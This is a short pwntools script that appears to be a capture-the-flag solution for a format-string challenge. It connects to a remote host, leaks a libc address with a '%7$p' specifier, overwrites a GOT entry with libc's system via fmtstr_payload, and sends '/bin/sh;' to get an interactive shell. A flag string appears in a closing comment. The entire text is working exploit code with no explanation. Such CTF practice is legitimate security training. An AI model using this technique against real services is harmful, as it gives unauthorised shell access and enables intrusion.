
from pwn import *

context.clear(arch = 'amd64')

# r = process('./fmtstr', level='error')

r = remote('143.198.127.103', 42002)
libc = ELF('./libc-2.31.so')

system = libc.sym['system']

r.recvuntil(b':clown:)\n')
r.sendline(b'N')

r.recvuntil(b'input:\n')
r.sendline(f'%7$p '.encode())
LIBC = int(r.recv().split()[0], 16) - 0x1c04a0

r.sendline(fmtstr_payload(6, {0x405028: LIBC+system}, write_size="short"))

r.recvuntil(b'input:\n')
r.sendline(b'/bin/sh;')
r.interactive()

# flag{w1th_just_s0m3_str1ngz_1_b3c4m3_4_g0d_4t_r3d1r3ct10n}